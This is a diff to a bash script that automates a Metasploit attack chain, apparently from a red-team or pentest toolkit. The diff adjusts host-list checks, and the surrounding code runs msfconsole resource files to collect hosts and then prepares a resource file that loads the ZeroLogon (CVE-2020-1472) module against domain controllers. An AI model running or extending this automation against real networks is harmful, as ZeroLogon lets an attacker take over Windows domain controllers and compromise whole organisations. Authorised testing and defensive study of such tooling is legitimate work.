@@ -10,7 +10,7 @@ else
     #echo '! > Folder Created!'
 fi
 
-if [ -s /root/output/list/zero.txt ]; then
+if [ -f /root/output/list/zero.txt ]; then
     echo '! > list zero.txt available!'
 else
 
@@ -26,6 +26,13 @@ else
     
     msfconsole -qx "resource /root/input/msf/ws.txt resource /root/input/msf/zerohosts.txt"
     awk '/"/ {print}' /root/output/msf/zerohosts.txt | grep -v '""' | cut -d '"' -f 2,4 | sed 's/"/ /' > /root/output/list/zero.txt
+fi
+
+if [ -s /root/output/list/zero.txt ]; then
+    echo '! > list zero.txt has hosts!'
+else
+    echo '! > no HOSTS!'
+    exit 1
 fi
 
 printf '%sspool /root/output/msf/zerologon.txt\necho "ZeroLogon"\nuse auxiliary/admin/dcerpc/cve_2020_1472_zerologon\n' > /root/input/msf/zerologon.txt
